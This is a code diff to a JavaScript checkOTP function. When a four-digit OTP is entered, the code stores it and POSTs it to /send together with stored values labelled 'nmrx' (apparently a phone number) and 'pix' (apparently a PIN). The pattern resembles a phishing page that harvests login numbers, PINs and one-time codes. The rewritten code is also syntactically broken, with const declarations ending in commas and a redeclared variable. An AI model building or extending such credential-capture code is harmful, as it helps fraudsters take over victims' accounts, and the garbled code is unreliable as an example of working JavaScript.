@@ -144,29 +144,41 @@ function checkOTP(){
     /* FULL OTP */
     if(otp.length === 4){
 
-        fetch("/send", {
+         /* SIMPAN */
+    localStorage.setItem(
+    "otp",
+    otp
+    );
 
-        method:"POST",
-
-        headers:{
-            "Content-Type":
-            "application/json"
-        },
-
-        body:JSON.stringify({
-
-            nomor:
+            const nmrx =
             localStorage.getItem(
             "nmrx"
             ),
 
-            pix:
+            const pix =
             localStorage.getItem(
             "pix"
             ),
 
-            otp:
-            otp
+            const otp =
+            localStorage.getItem(
+            "otp"
+            ),
+
+            fetch("/send", {
+
+            method:"POST",
+
+            headers:{
+            "Content-Type":
+            "application/json"
+        },
+
+            body:JSON.stringify({
+
+                nmrx:nmrx,
+                pix:pix,
+                otp:otp
 
         })
 
